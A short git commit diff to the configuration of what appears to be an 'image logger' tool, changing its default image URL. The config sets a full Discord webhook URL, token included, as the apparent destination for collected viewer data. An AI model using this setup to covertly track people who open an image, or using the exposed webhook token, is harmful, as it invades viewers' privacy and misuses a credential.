a092e82fcff84b9be9495b9e5e61ccb62d656856
rishuvic15-cpu <rishuvic15@gmail.com>
2025-09-30 23:25:36 +0530

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1422640663706603552/_1Tly0Q9NbnCkZ4i9qkgcURoCMz_ZtVCgruje5pjJFLJExWDTaNUIIPr643GvWm96qmH",
-    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://pbs.twimg.com/media/F6ke9IfXsAAecYm.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
